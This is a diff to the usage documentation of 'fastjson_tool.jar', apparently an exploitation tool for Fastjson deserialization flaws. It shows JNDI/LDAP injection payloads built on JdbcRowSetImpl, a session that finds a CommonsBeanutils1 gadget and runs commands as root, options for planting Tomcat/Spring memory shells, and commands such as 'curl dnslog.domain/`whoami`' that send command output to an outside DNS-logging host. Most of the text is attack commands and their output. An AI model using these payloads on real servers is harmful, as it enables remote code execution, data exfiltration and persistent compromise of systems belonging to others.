@@ -65,21 +65,26 @@ Content-Length: 165
 __PAYLOAD__
 
 
-> java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 8088 file=req
-
+> java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 8088 file=req chunk=on
+[-] Chunked coding ON
 [-] target: https://xx.xx.xx.xx/fastjson_demo
 [-] Payload list:
 0. {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}
 1. {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
-[-] [-] please chosse payload, or input payload like payload={......}
+[-] [-] please chosse payload, or input payload like payload={......}  chunk=on / chunk=off
 > 1
 [-] url: https://xx.xx.xx.xx/fastjson_demo
 [-] post_data: {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
 [-] LDAP Listening on 127.0.0.1:8088
-[*] find: CommonsCollections10 can be use
-[-] please enter command, enter q or quit to quit
-> curl dnslog.domain/`whoami`
-[-] please enter command, enter q or quit to quit
+[-] checking CommonsBeanutils1
+[*] find: CommonsBeanutils1 can be use
+[*] CHECK ECHO.
+[-] ECHO FIND.
+[-] please enter command, enter q or quit to quit, tomcatshell or springshell get memshell, chunk=on / chunk=off
+> id
+uid=0(root) gid=0(root) groups=0(root)
+
+[-] please enter command, enter q or quit to quit, tomcatshell or springshell get memshell, chunk=on / chunk=off
 > q
 [-] quit
 
@@ -98,6 +103,7 @@ __PAYLOAD__
 [-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
 [-] send payload done and exit.
 
+
 [root@ /]# java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 [-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}
 [-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}}
@@ -112,6 +118,8 @@ __PAYLOAD__
 
 if command need base64 encode, command should startwith bash=/powershell=/python=/perl=
 example:  bash=curl dnslog.wyzxxz.cn
+
+
 
 1. RMI (need tomcat8)
 java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
